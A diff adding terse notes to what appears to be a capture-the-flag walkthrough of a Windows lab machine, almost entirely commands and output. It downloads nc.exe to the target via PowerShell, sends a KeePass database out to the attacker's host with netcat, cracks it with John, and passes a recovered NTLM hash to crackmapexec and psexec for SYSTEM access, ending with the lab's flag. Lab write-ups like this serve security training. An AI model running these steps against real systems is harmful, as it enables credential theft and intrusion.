@@ -62,3 +62,43 @@ jeeves\kohsuke
 [+]Priviliage Escalation
 C:\Users\kohsuke\Documents>dir
 CEH.kdbx >> Kepass Passwords
+
+locate nc.exe >> /usr/share/sqlninja/apps
+sudo python3 -m http.server 80 
+C:\Users\kohsuke\Documents> powershell -c iwr 10.10.14.42:80/nc.exe -o nc.exe
+
+
+C:\Users\kohsuke\Documents> nc.exe -w 3 10.10.14.42 1234 < CEH.kdbx
+sudo nc -lvp 1234 > CEH.kdbx
+
+keepass2john CEH.kdbx > kdbx.hash
+john -w /usr/share/wordlist/rockyou.txt hash
+> moonshine1
+
+keepassxc CEH.kdbx
+moonshine1
+
+Backup Staff
+e0fb1fb85756c24235ff238cbe81fe00
+
+crackmapexec smb 10.10.10.63 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00' 
+[+]Pwned
+
+impacket-psexec WORKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
+
+C:\Windows\system32>whoami
+nt authority\system
+
+
+C:\Users\Administrator\Desktop>type hm.txt
+The flag is elsewhere.  Look deeper.
+
+C:\Users\Administrator\Desktop>dir /r /s
+hm.txt:root.txt:$DATA
+
+C:\Users\Administrator\Desktop>more < hm.txt:root.txt
+afbc5bd4b615a60648cec41c6ac92530
+
+
+
+
